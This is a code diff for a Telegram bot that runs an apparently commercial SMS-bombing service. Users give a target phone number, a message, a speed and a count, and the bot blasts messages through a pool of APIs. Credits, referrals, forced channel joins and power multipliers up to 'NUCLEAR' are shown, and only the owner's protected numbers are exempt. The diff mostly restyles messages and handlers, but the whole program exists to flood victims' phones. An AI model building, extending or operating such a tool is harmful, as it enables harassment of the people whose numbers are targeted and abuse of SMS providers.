-    stxt = f"\n{em(EMOJI_CROSS, '🛑')} <b>Stopped!</b>" if was_cancel else ""
+        ctxt = f"\n💰 Used: <b>{sent_ok}</b> | Left: <b>{get_user_credits(uid, load())}</b>"
+    stxt = f"\n🛑 <b>Stopped!</b>" if was_cancel else ""
     if is_owner(uid, load()):
         back = [btn("owner panel", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
     elif is_admin(uid, load()):
@@ -1565,13 +1699,11 @@ async def _run_blast(bot, msg, uid, number, message, count, devices, speed, pm):
     try:
         await pmsg.edit_text(
             f"{icon} <b>Blast Result</b>{stxt}\n\n"
-            f"{em(EMOJI_PHONE, '📞')} <code>{esc(mask_number(number))}</code>\n"
-            f"{em(EMOJI_STAR, '💬')} <code>{esc(str(message)[:50])}</code>\n"
-            f"{em(EMOJI_CHECK, '✅')} Sent: <b>{sent_ok}</b>\n"
-            f"{em(EMOJI_CROSS, '❌')} Failed: <b>{sent_fail}</b>\n"
-            f"{em(EMOJI_STAR, '🔢')} Power: <b>{pm}x</b>\n"
-            f"{em(EMOJI_ROCKET, '⚡')} Rate: <b>{rate:.1f}/s</b>\n"
-            f"{em(EMOJI_GEAR, '⏱')} {fmt_duration(dur)}{ctxt}",
+            f"📞 <code>{esc(mask_number(number))}</code>\n"
+            f"💬 <code>{esc(str(message)[:50])}</code>\n"
+            f"✅ Sent: <b>{sent_ok}</b>\n❌ Failed: <b>{sent_fail}</b>\n"
+            f"🔢 Power: <b>{pm}x</b>\n⚡ Rate: <b>{rate:.1f}/s</b>\n"
+            f"⏱ {fmt_duration(dur)}{ctxt}",
             reply_markup=InlineKeyboardMarkup(inline_keyboard=[back]), parse_mode="HTML")
     except Exception: pass
 
@@ -1597,7 +1729,7 @@ async def joined_all(bot, uid, d):
     return len(missing) == 0, missing
 
 def fj_text(missing):
-    lines = [f"{em(EMOJI_CROSS, '⛔')} <b>Pehle join karein!</b>\n", f"{em(EMOJI_BELL, '👇')} ᴊᴏɪɴ:"]
+    lines = [f"⛔ <b>Pehle join karein!</b>\n", f"👇 ᴊᴏɪɴ:"]
     for ch in missing: lines.append(f"\n• <a href='{esc(ch['link'])}'>{esc(ch.get('title', 'Channel'))}</a>")
     lines.append(f"\n\n<i>Join ke baad /start karein.</i>")
     return "\n".join(lines)
@@ -1606,7 +1738,7 @@ def fj_kb(missing):
     rows = []
     for ch in missing:
         rows.append([btn_url(f"join {ch.get('title', 'Channel')}", ch["link"], EMOJI_BELL, "🔔", style="success")])
-    rows.append([btn("refresh / check", "fj:check", EMOJI_GEAR, "🔄", style="primary")])
+    rows.append([btn("check", "fj:check", EMOJI_GEAR, "🔄", style="primary")])
     return InlineKeyboardMarkup(inline_keyboard=rows)
 
 # ============================================================
@@ -1614,33 +1746,25 @@ def fj_kb(missing):
 # ============================================================
 R = Router()
 
-async def _render_home(cq: CallbackQuery, state: FSMContext, skip_fj: bool = True):
+async def _render_home(cq, state, skip_fj=True):
     await state.clear()
     uid = cq.from_user.id
     d = load()
     if not skip_fj:
         joined, missing = await joined_all(cq.bot, uid, d)
         if not joined:
-            await safe_edit(cq, fj_text(missing), fj_kb(missing))
-            return
+            await safe_edit(cq, fj_text(missing), fj_kb(missing)); return
     if is_owner(uid, d):
         await safe_edit(cq, owner_panel_text(d), owner_kb(d))
         _OWNER_PANEL_STATE[uid] = {"chat_id": cq.message.chat.id, "msg_id": cq.message.message_id,
                                     "active": True, "last_user_action": time.time()}
         return
     if is_admin(uid, d):
-        await safe_edit(cq, admin_panel_text(d), admin_kb(d))
-        return
+        await safe_edit(cq, admin_panel_text(d), admin_kb(d)); return
     if is_banned(uid, d):
-        reason = d.get("ban_reasons", {}).get(str(uid), "")
-        rtxt = f"\n<b>Reason:</b> {esc(reason)}" if reason else ""
-        await safe_edit(cq, f"{em(EMOJI_CROSS, '🚫')} <b>Banned.</b>{rtxt}",
-                        kb([("refresh", "user:home")]))
-        return
+        await safe_edit(cq, f"🚫 <b>Banned.</b>", kb([("refresh","user:home")])); return
     if d.get("settings", {}).get("maintenance"):
-        await safe_edit(cq, f"{em(EMOJI_WARNING, '🔧')} <b>Under Maintenance</b>\n\nThodi der baad try karein.",
-                        kb([("refresh", "user:home")]))
-        return
+        await safe_edit(cq, f"🔧 <b>Maintenance</b>", kb([("refresh","user:home")])); return
     await safe_edit(cq, user_home_text(uid, d), user_kb())
 
 @R.message(Command("start"))
@@ -1655,23 +1779,16 @@ async def cmd_start(m: Message, state: FSMContext):
     if code.startswith("SJ") and not d["users"].get(str(uid), {}).get("referred_by"):
         ok, msgref, referrer = process_referral(uid, code, d)
         if ok and referrer:
-            try:
-                await m.bot.send_message(referrer,
-                    f"{em(EMOJI_GIFT, '🎉')} <b>Referral!</b> {msgref}", parse_mode="HTML")
+            try: await m.bot.send_message(referrer, f"🎉 <b>Referral!</b> {msgref}", parse_mode="HTML")
             except Exception: pass
     save()
     if is_new:
-        _spawn(send_log(m.bot,
-            f"🆕 <b>NEW USER</b>\n\n"
-            f"👤 {esc(m.from_user.full_name or 'User')}\n"
-            f"🆔 <code>{uid}</code>\n🌐 @{esc(m.from_user.username or 'None')}\n"
-            f"📅 {fmt_time(now_ts())}"))
+        _spawn(send_log(m.bot, f"🆕 <b>NEW USER</b>\n👤 {esc(m.from_user.full_name or 'User')}\n🆔 <code>{uid}</code>"))
     joined, missing = await joined_all(m.bot, uid, d)
     if not joined:
-        await m.answer(fj_text(missing), reply_markup=fj_kb(missing),
-                       parse_mode="HTML", disable_web_page_preview=True); return
+        await m.answer(fj_text(missing), reply_markup=fj_kb(missing), parse_mode="HTML", disable_web_page_preview=True); return
     owner_disp = get_owner_display(d)
-    cap = f"{em(EMOJI_ROCKET, '🚀')} Welcome!"
+    cap = f"🚀 Welcome!"
     if owner_disp: cap += f"\nOwner: {owner_disp}"
     _spawn(send_video(m.bot, m.chat.id, caption=cap))
     if is_owner(uid, d):
@@ -1682,89 +1799,79 @@ async def cmd_start(m: Message, state: FSMContext):
     if is_admin(uid, d):
         await m.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML"); return
     if is_banned(uid, d):
-        reason = d.get("ban_reasons", {}).get(str(uid), "")
-        rtxt = f"\n<b>Reason:</b> {esc(reason)}" if reason else ""
-        await m.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Banned.</b>{rtxt}", parse_mode="HTML"); return
+        await m.answer(f"🚫 <b>Banned.</b>", parse_mode="HTML"); return
     if d.get("settings", {}).get("maintenance") and not is_admin(uid, d):
-        await m.answer(f"{em(EMOJI_WARNING, '🔧')} <b>Under Maintenance</b>\n\nThodi der baad try karein.",
-                       parse_mode="HTML"); return
+        await m.answer(f"🔧 <b>Maintenance</b>", parse_mode="HTML"); return
     await m.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")
 
 @R.callback_query(F.data == "fj:check")
-async def fj_check(cq: CallbackQuery, state: FSMContext):
+async def fj_check(cq, state):
     uid = cq.from_user.id
     d = load()
     joined, missing = await joined_all(cq.bot, uid, d)
     if not joined:
-        try: await cq.answer("❌ Not joined yet!", show_alert=True)
+        try: await cq.answer("❌ Not joined!")
         except Exception: pass
-        await safe_edit(cq, fj_text(missing), fj_kb(missing))
-        return
+        await safe_edit(cq, fj_text(missing), fj_kb(missing)); return
     try: await cq.answer("✅ Verified!")
     except Exception: pass
-    owner_disp = get_owner_display(d)
-    cap = f"{em(EMOJI_ROCKET, '🚀')} Welcome!"
-    if owner_disp: cap += f"\nOwner: {owner_disp}"
-    _spawn(send_video(cq.bot, cq.message.chat.id, caption=cap))
     await _render_home(cq, state, skip_fj=True)
 
 # ----- USER SEND -----
 @R.callback_query(F.data == "user:send")
-async def user_send_start(cq: CallbackQuery, state: FSMContext):
+async def user_send_start(cq, state):
     d = load(); uid = cq.from_user.id
     if is_banned(uid, d):
-        try: await cq.answer("🚫 Banned!", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     if d.get("settings", {}).get("maintenance") and not is_admin(uid, d):
-        try: await cq.answer("🔧 Maintenance!", show_alert=True)
+        try: await cq.answer("🔧 Maintenance")
         except Exception: pass
         return
     if not is_admin(uid, d) and not is_owner(uid, d):
         ulim = get_user_send_limit(uid, d)
         if ulim is not None and ulim <= 0:
-            try: await cq.answer("🚫 Limit 0.", show_alert=True)
+            try: await cq.answer("🚫 Limit 0.")
             except Exception: pass
             return
     try: await cq.answer()
     except Exception: pass
     await state.set_state(S.send_number)
     await safe_edit(cq,
-        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
+        f"📞 <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
         f"Jis number pe SMS bhejna hai:\n<i>Example: +919876543210</i>",
         kb([(f"{sc('cancel')}", "user:home")]))
 
 @R.message(S.send_number)
-async def user_got_number(m: Message, state: FSMContext):
+async def user_got_number(m, state):
     number = (m.text or "").strip()
     clean = number.replace("+", "").replace(" ", "").replace("-", "")
     if not clean.isdigit() or len(clean) < 7:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number.", parse_mode="HTML"); return
+        await m.answer(f"❌ Invalid number.", parse_mode="HTML"); return
     if number in PROTECTED_NUMBERS:
         d = load(); puid = PROTECTED_NUMBERS[number]
         if not is_owner(m.from_user.id, d) and m.from_user.id != puid:
-            await m.answer(f"{em(EMOJI_LOCK, '🔒')} Protected number!", parse_mode="HTML"); return
+            await m.answer(f"🔒 Protected!", parse_mode="HTML"); return
     await state.update_data(number=number)
     await state.set_state(S.send_message)
-    await m.answer(
-        f"{em(EMOJI_CHECK, '✅')} Number: <code>{esc(mask_number(number))}</code>\n\n"
-        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\nMessage:",
+    await m.answer(f"✅ Number: <code>{esc(mask_number(number))}</code>\n\n💬 <b>{sc('step 2/4')} — {sc('message')}</b>\n\nMessage:",
         reply_markup=kb([(f"{sc('cancel')}", "user:cancel")]), parse_mode="HTML")
 
 @R.message(S.send_message)
-async def user_got_message(m: Message, state: FSMContext):
+async def user_got_message(m, state):
     txt = (m.text or "").strip()
     if not txt:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Empty.", parse_mode="HTML"); return
+        await m.answer(f"❌ Empty.", parse_mode="HTML"); return
     if len(txt) > 1000:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Too long.", parse_mode="HTML"); return
+        await m.answer(f"❌ Too long.", parse_mode="HTML"); return
     await state.update_data(message=txt)
     await state.set_state(S.send_speed)
-    await m.answer(f"{em(EMOJI_CHECK, '✅')} Saved!\n\n{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>",
+    await m.answer(f"✅ Saved!\n\n⚡ <b>{sc('step 3/4')} — {sc('speed')}</b>",
                    reply_markup=speed_kb("user"), parse_mode="HTML")
 
-@R.callback_query(F.data.in_({"user:speed:fast", "user:speed:medium", "user:speed:slow"}))
-async def user_speed_sel(cq: CallbackQuery, state: FSMContext):
+@R.callback_query(F.data.in_({"user:speed:fast","user:speed:medium","user:speed:slow"}))
+async def user_speed_sel(cq, state):
     try: await cq.answer()
     except Exception: pass
     d = load(); uid = cq.from_user.id
@@ -1782,89 +1889,83 @@ async def user_speed_sel(cq: CallbackQuery, state: FSMContext):
     cinfo = ""
     if not is_admin(uid, d) and not is_owner(uid, d):
         uc = get_user_credits(uid, d)
-        cinfo = f"\n{em(EMOJI_MONEY, '💰')} Credits: <b>{uc}</b>"
+        cinfo = f"\n💰 Credits: <b>{uc}</b>"
     await safe_edit(cq,
-        f"{label} <b>selected!</b>\n\n"
-        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
-        f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{cnt}</b>{cinfo}\n\nKitne SMS?",
+        f"{label} <b>selected!</b>\n\n📊 <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
+        f"🔥 Online APIs : <b>{cnt}</b>{cinfo}\n\nKitne SMS?",
         kb([(f"{sc('cancel')}", "user:cancel")]))
 
 @R.message(S.send_count)
-async def user_got_count(m: Message, state: FSMContext):
+async def user_got_count(m, state):
     d = load(); uid = m.from_user.id
     fsmd = await state.get_data()
     try:
         cnt = int((m.text or "").strip())
         if cnt < 1: raise ValueError
     except Exception:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Number bhejo.", parse_mode="HTML"); return
+        await m.answer(f"❌ Number bhejo.", parse_mode="HTML"); return
     await state.clear()
     number = fsmd.get("number", ""); msg_text = fsmd.get("message", "")
     speed = fsmd.get("send_speed", SPEED_DEFAULT)
     if not is_admin(uid, d) and not is_owner(uid, d):
         cr = get_user_credits(uid, d)
         if cr <= 0:
-            await m.answer(f"{em(EMOJI_CROSS, '❌')} <b>No credits!</b>",
-                           reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML"); return
-        if cnt > cr:
-            await m.answer(f"{em(EMOJI_WARNING, '⚠️')} Only {cr} credits.", parse_mode="HTML")
-            cnt = cr
+            await m.answer(f"❌ No credits!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML"); return
+        if cnt > cr: cnt = cr
         ulim = get_user_send_limit(uid, d)
         if ulim is not None:
             if ulim <= 0:
-                await m.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Limit 0!</b>", parse_mode="HTML"); return
+                await m.answer(f"🚫 Limit 0!", parse_mode="HTML"); return
             if cnt > ulim: cnt = ulim
     devices = CACHED_DEVICES[:] if CACHED_DEVICES else []
     if not devices:
         try: devices = await scan_all(d)
         except Exception: devices = []
     if not devices:
-        await m.answer(f"{em(EMOJI_WARNING, '😴')} No APIs!",
-                       reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML"); return
+        await m.answer(f"😴 No APIs!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML"); return
     await blast(m.bot, m, uid, number, msg_text, cnt, devices, speed)
 
 # ----- OWNER SEND -----
 @R.callback_query(F.data == "owner:send")
-async def owner_send_start(cq: CallbackQuery, state: FSMContext):
+async def owner_send_start(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     await state.set_state(S.owner_send_number)
-    await safe_edit(cq, f"{em(EMOJI_CROWN, '👑')} <b>Owner SMS</b>\n\n<b>Step 1/4 — Number</b>",
+    await safe_edit(cq, f"👑 <b>Owner SMS</b>\n\n<b>Step 1/4 — Number</b>",
                     kb([(f"{sc('cancel')}", "owner:home")]))
 
 @R.message(S.owner_send_number)
-async def owner_got_number(m: Message, state: FSMContext):
+async def owner_got_number(m, state):
     number = (m.text or "").strip()
     clean = number.replace("+", "").replace(" ", "").replace("-", "")
     if not clean.isdigit() or len(clean) < 7:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Invalid.", parse_mode="HTML"); return
+        await m.answer(f"❌ Invalid.", parse_mode="HTML"); return
     await state.update_data(number=number)
     await state.set_state(S.owner_send_message)
-    await m.answer(f"{em(EMOJI_CHECK, '✅')} <code>{esc(number)}</code>\n\n<b>Step 2/4 — Message</b>",
+    await m.answer(f"✅ <code>{esc(number)}</code>\n\n<b>Step 2/4 — Message</b>",
                    reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")
 
 @R.message(S.owner_send_message)
-async def owner_got_message(m: Message, state: FSMContext):
+async def owner_got_message(m, state):
     txt = (m.text or "").strip()
     if not txt:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Empty.", parse_mode="HTML"); return
+        await m.answer(f"❌ Empty.", parse_mode="HTML"); return
     await state.update_data(message=txt)
     await state.set_state(S.owner_send_speed)
-    await m.answer(f"{em(EMOJI_CHECK, '✅')} Saved!\n\n<b>Step 3/4 — Speed</b>",
+    await m.answer(f"✅ Saved!\n\n<b>Step 3/4 — Speed</b>",
                    reply_markup=speed_kb("owner"), parse_mode="HTML")
 
-@R.callback_query(F.data.in_({"owner:speed:fast", "owner:speed:medium", "owner:speed:slow"}))
-async def owner_speed_sel(cq: CallbackQuery, state: FSMContext):
+@R.callback_query(F.data.in_({"owner:speed:fast","owner:speed:medium","owner:speed:slow"}))
+async def owner_speed_sel(cq, state):
     try: await cq.answer()
     except Exception: pass
     smap = {"owner:speed:fast": SPEED_FAST, "owner:speed:medium": SPEED_MEDIUM, "owner:speed:slow": SPEED_SLOW}
-    sel = smap.get(cq.data, SPEED_FAST)
-    await state.update_data(send_speed=sel)
+    await state.update_data(send_speed=smap.get(cq.data, SPEED_FAST))
     await state.set_state(S.owner_send_count)
     devices = CACHED_DEVICES[:] if CACHED_DEVICES else []
     if not devices:
@@ -1875,13 +1976,13 @@ async def owner_speed_sel(cq: CallbackQuery, state: FSMContext):
                     kb([(f"{sc('cancel')}", "owner:home")]))
 
 @R.message(S.owner_send_count)
-async def owner_got_count(m: Message, state: FSMContext):
+async def owner_got_count(m, state):
     fsmd = await state.get_data()
     try:
         cnt = int((m.text or "").strip())
         if cnt < 1: raise ValueError
     except Exception:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Number bhejo.", parse_mode="HTML"); return
+        await m.answer(f"❌ Number bhejo.", parse_mode="HTML"); return
     await state.clear()
     number = fsmd.get("number", ""); msg_text = fsmd.get("message", "")
     speed = fsmd.get("send_speed", SPEED_DEFAULT)
@@ -1890,51 +1991,50 @@ async def owner_got_count(m: Message, state: FSMContext):
         try: devices = await scan_all(load())
         except Exception: devices = []
     if not devices:
-        await m.answer(f"{em(EMOJI_WARNING, '😴')} No APIs!", parse_mode="HTML"); return
+        await m.answer(f"😴 No APIs!", parse_mode="HTML"); return
     await blast(m.bot, m, m.from_user.id, number, msg_text, cnt, devices, speed)
 
 # ----- ADMIN SEND -----
 @R.callback_query(F.data == "admin:send")
-async def admin_send_start(cq: CallbackQuery, state: FSMContext):
+async def admin_send_start(cq, state):
     d = load()
     if not is_admin(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     await state.set_state(S.admin_send_number)
-    await safe_edit(cq, f"{em(EMOJI_SHIELD, '🛡')} <b>Admin SMS</b>\n\n<b>Step 1/4 — Number</b>",
+    await safe_edit(cq, f"🛡 <b>Admin SMS</b>\n\n<b>Step 1/4 — Number</b>",
                     kb([(f"{sc('cancel')}", "admin:home")]))
 
 @R.message(S.admin_send_number)
-async def admin_got_number(m: Message, state: FSMContext):
+async def admin_got_number(m, state):
     number = (m.text or "").strip()
     clean = number.replace("+", "").replace(" ", "").replace("-", "")
     if not clean.isdigit() or len(clean) < 7:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Invalid.", parse_mode="HTML"); return
+        await m.answer(f"❌ Invalid.", parse_mode="HTML"); return
     await state.update_data(number=number)
     await state.set_state(S.admin_send_message)
-    await m.answer(f"{em(EMOJI_CHECK, '✅')} <code>{esc(mask_number(number))}</code>\n\n<b>Step 2/4 — Message</b>",
+    await m.answer(f"✅ <code>{esc(mask_number(number))}</code>\n\n<b>Step 2/4 — Message</b>",
                    reply_markup=kb([(f"{sc('cancel')}", "admin:home")]), parse_mode="HTML")
 
 @R.message(S.admin_send_message)
-async def admin_got_message(m: Message, state: FSMContext):
+async def admin_got_message(m, state):
     txt = (m.text or "").strip()
     if not txt:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Empty.", parse_mode="HTML"); return
+        await m.answer(f"❌ Empty.", parse_mode="HTML"); return
     await state.update_data(message=txt)
     await state.set_state(S.admin_send_speed)
-    await m.answer(f"{em(EMOJI_CHECK, '✅')} Saved!\n\n<b>Step 3/4 — Speed</b>",
+    await m.answer(f"✅ Saved!\n\n<b>Step 3/4 — Speed</b>",
                    reply_markup=speed_kb("admin"), parse_mode="HTML")
 
-@R.callback_query(F.data.in_({"admin:speed:fast", "admin:speed:medium", "admin:speed:slow"}))
-async def admin_speed_sel(cq: CallbackQuery, state: FSMContext):
+@R.callback_query(F.data.in_({"admin:speed:fast","admin:speed:medium","admin:speed:slow"}))
+async def admin_speed_sel(cq, state):
     try: await cq.answer()
     except Exception: pass
     smap = {"admin:speed:fast": SPEED_FAST, "admin:speed:medium": SPEED_MEDIUM, "admin:speed:slow": SPEED_SLOW}
-    sel = smap.get(cq.data, SPEED_FAST)
-    await state.update_data(send_speed=sel)
+    await state.update_data(send_speed=smap.get(cq.data, SPEED_FAST))
     await state.set_state(S.admin_send_count)
     devices = CACHED_DEVICES[:] if CACHED_DEVICES else []
     if not devices:
@@ -1945,13 +2045,13 @@ async def admin_speed_sel(cq: CallbackQuery, state: FSMContext):
                     kb([(f"{sc('cancel')}", "admin:home")]))
 
 @R.message(S.admin_send_count)
-async def admin_got_count(m: Message, state: FSMContext):
+async def admin_got_count(m, state):
     fsmd = await state.get_data()
     try:
         cnt = int((m.text or "").strip())
         if cnt < 1: raise ValueError
     except Exception:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Number bhejo.", parse_mode="HTML"); return
+        await m.answer(f"❌ Number bhejo.", parse_mode="HTML"); return
     await state.clear()
     number = fsmd.get("number", ""); msg_text = fsmd.get("message", "")
     speed = fsmd.get("send_speed", SPEED_DEFAULT)
@@ -1960,74 +2060,83 @@ async def admin_got_count(m: Message, state: FSMContext):
         try: devices = await scan_all(load())
         except Exception: devices = []
     if not devices:
-        await m.answer(f"{em(EMOJI_WARNING, '😴')} No APIs!", parse_mode="HTML"); return
+        await m.answer(f"😴 No APIs!", parse_mode="HTML"); return
     await blast(m.bot, m, m.from_user.id, number, msg_text, cnt, devices, speed)
 
 # ----- STOP -----
 @R.callback_query(F.data == "user:stop_send")
-async def stop_blast(cq: CallbackQuery, state: FSMContext):
+async def stop_blast(cq, state):
     uid = cq.from_user.id
     async with SESSIONS_LOCK:
         s = USER_SESSIONS.get(uid)
         if not s or (s.task and s.task.done()):
-            try: await cq.answer("✅ No active blast!", show_alert=True)
+            try: await cq.answer("✅ No active blast!")
             except Exception: pass
             return
         s.cancelled = True
-    try: await cq.answer("🛑 Stop signal sent!", show_alert=True)
-    except Exception: pass
-    try:
-        async with s.lock: cs, cf = s.sent, s.failed
-        await cq.message.edit_text(f"{em(EMOJI_CROSS, '🛑')} <b>Stopping...</b>\n\n✅ {cs} | ❌ {cf}", parse_mode="HTML")
+    try: await cq.answer("🛑 Stop sent!")
     except Exception: pass
 
-# ----- POWER MODE -----
+# ----- POWER -----
 @R.callback_query(F.data.startswith("owner:set_power:"))
-async def set_power(cq: CallbackQuery, state: FSMContext):
+async def set_power(cq, state):
     global CURRENT_POWER_MODE, LAST_KNOWN_DEVICE_COUNT
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try:
         mult = int(cq.data.split("owner:set_power:", 1)[1])
         if mult not in ALLOWED_POWER_MODES: raise ValueError
     except Exception:
-        try: await cq.answer("❌ Invalid", show_alert=True)
+        try: await cq.answer("❌ Invalid")
         except Exception: pass
         return
     CURRENT_POWER_MODE = mult
     real = len(CACHED_DEVICES)
     if real > 0: LAST_KNOWN_DEVICE_COUNT = real * mult
-    desc = {2: "Safe", 3: "Fast", 4: "Aggressive", 5: "MAXIMUM", 10: "NUCLEAR"}[mult]
-    icon = {2: "🚀", 3: "🔥", 4: "💥", 5: "💣", 10: "☠️"}[mult]
-    try: await cq.answer(f"{icon} Power: {mult}x\n{desc}")
+    try: await cq.answer(f"⚡ Power: {mult}x")
     except Exception: pass
     await safe_edit(cq, owner_panel_text(d), owner_kb(d))
     uid = cq.from_user.id
     _OWNER_PANEL_STATE[uid] = {"chat_id": cq.message.chat.id, "msg_id": cq.message.message_id,
                                 "active": True, "last_user_action": time.time()}
 
-# ----- OWNER NAME -----
-@R.callback_query(F.data == "owner:edit_name")
-async def edit_name_start(cq: CallbackQuery, state: FSMContext):
+# ----- MAINTENANCE -----
+@R.callback_query(F.data == "owner:toggle_maint")
+async def maint_toggle(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
+        except Exception: pass
+        return
+    cur = d.setdefault("settings", {}).get("maintenance", False)
+    d["settings"]["maintenance"] = not cur
+    save()
+    try: await cq.answer(f"🔧 {'ON' if d['settings']['maintenance'] else 'OFF'}")
+    except Exception: pass
+    await safe_edit(cq, owner_panel_text(d), owner_kb(d))
+
+# ----- EDIT NAME -----
+@R.callback_query(F.data == "owner:edit_name")
+async def edit_name_start(cq, state):
+    d = load()
+    if not is_owner(cq.from_user.id, d):
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     await state.set_state(S.owner_edit_name)
-    cur = get_owner_display(d); cur_s = cur if cur else "<i>(hidden)</i>"
+    cur = get_owner_display(d) or "<i>(hidden)</i>"
     await safe_edit(cq,
-        f"{em(EMOJI_CROWN, '✏️')} <b>EDIT OWNER NAME</b>\n\nCurrent: <b>{cur_s}</b>\n\n"
-        f"• Text → set\n• <code>null</code>/<code>hide</code> → hide\n• <code>cancel</code>",
+        f"✏️ <b>EDIT OWNER NAME</b>\n\nCurrent: <b>{cur}</b>\n\n"
+        f"• Text → set\n• <code>null</code> → hide\n• <code>cancel</code>",
         kb([(f"{sc('cancel')}", "owner:settings")]))
 
 @R.message(S.owner_edit_name)
-async def edit_name_done(m: Message, state: FSMContext):
+async def edit_name_done(m, state):
     d = load()
     if not is_owner(m.from_user.id, d):
         await state.clear(); return
@@ -2035,74 +2144,30 @@ async def edit_name_done(m: Message, state: FSMContext):
     if low in ("cancel", "/cancel"):
         await state.clear()
         await m.answer("❌ Cancelled.", reply_markup=owner_kb(d), parse_mode="HTML"); return
-    if low in ("null", "none", "empty", "hide", "-", "0"):
+    if low in ("null", "none", "hide", "-", "0"):
         d.setdefault("settings", {})["owner_display"] = None
         save(); await state.clear()
-        await m.answer(f"{em(EMOJI_CHECK, '✅')} <b>Hidden!</b>", reply_markup=owner_kb(d), parse_mode="HTML")
-        return
+        await m.answer(f"✅ <b>Hidden!</b>", reply_markup=owner_kb(d), parse_mode="HTML"); return
     if not raw:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Use <code>null</code>.", parse_mode="HTML"); return
+        await m.answer(f"❌ Use <code>null</code>.", parse_mode="HTML"); return
     val = raw[:64]
     d.setdefault("settings", {})["owner_display"] = val
     save(); await state.clear()
-    await m.answer(f"{em(EMOJI_CHECK, '✅')} Updated: {esc(val)}", reply_markup=owner_kb(d), parse_mode="HTML")
+    await m.answer(f"✅ Updated: {esc(val)}", reply_markup=owner_kb(d), parse_mode="HTML")
 
-# ----- PANEL HOMES -----
-@R.callback_query(F.data.in_({"owner:home", "owner:refresh"}))
-async def owner_home(cq: CallbackQuery, state: FSMContext):
-    d = load(); uid = cq.from_user.id
-    if not is_owner(uid, d):
-        try: await cq.answer("🚫", show_alert=True)
-        except Exception: pass
-        await _render_home(cq, state, skip_fj=True)
-        return
+# ----- HOMES -----
+@R.callback_query(F.data.in_({"owner:home","owner:refresh","admin:home","admin:refresh","user:home","user:cancel"}))
+async def any_home(cq, state):
     try: await cq.answer()
     except Exception: pass
     await _render_home(cq, state, skip_fj=True)
-
-@R.callback_query(F.data.in_({"admin:home", "admin:refresh"}))
-async def admin_home(cq: CallbackQuery, state: FSMContext):
-    d = load()
-    if not is_admin(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
-        except Exception: pass
-        await _render_home(cq, state, skip_fj=True)
-        return
-    try: await cq.answer()
-    except Exception: pass
-    await _render_home(cq, state, skip_fj=True)
-
-@R.callback_query(F.data.in_({"user:home", "user:cancel"}))
-async def user_home(cq: CallbackQuery, state: FSMContext):
-    try: await cq.answer()
-    except Exception: pass
-    await _render_home(cq, state, skip_fj=True)
-
-# ----- MAINTENANCE TOGGLE -----
-@R.callback_query(F.data == "owner:toggle_maint")
-async def maint_toggle(cq: CallbackQuery, state: FSMContext):
-    d = load()
-    if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
-        except Exception: pass
-        return
-    cur = d.setdefault("settings", {}).get("maintenance", False)
-    d["settings"]["maintenance"] = not cur
-    save()
-    st = "ON" if d["settings"]["maintenance"] else "OFF"
-    try: await cq.answer(f"🔧 Maintenance {st}!")
-    except Exception: pass
-    await safe_edit(cq, owner_panel_text(d), owner_kb(d))
-    uid = cq.from_user.id
-    _OWNER_PANEL_STATE[uid] = {"chat_id": cq.message.chat.id, "msg_id": cq.message.message_id,
-                                "active": True, "last_user_action": time.time()}
 
 # ----- FIREBASE -----
 @R.callback_query(F.data.startswith("owner:fb:menu"))
-async def fb_menu(cq: CallbackQuery, state: FSMContext):
+async def fb_menu(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     await state.clear()
@@ -2110,24 +2175,24 @@ async def fb_menu(cq: CallbackQuery, state: FSMContext):
     except Exception: pass
     parts = cq.data.split(":")
     page = int(parts[3]) if len(parts) > 3 else 0
-    await safe_edit(cq, f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\nTotal: <b>{len(d.get('firebases', []))}</b>",
+    await safe_edit(cq, f"🔥 <b>Firebase Manager</b>\n\nTotal: <b>{len(d.get('firebases', []))}</b>",
                     fb_menu_kb(d, page))
 
 @R.callback_query(F.data == "owner:fb:add")
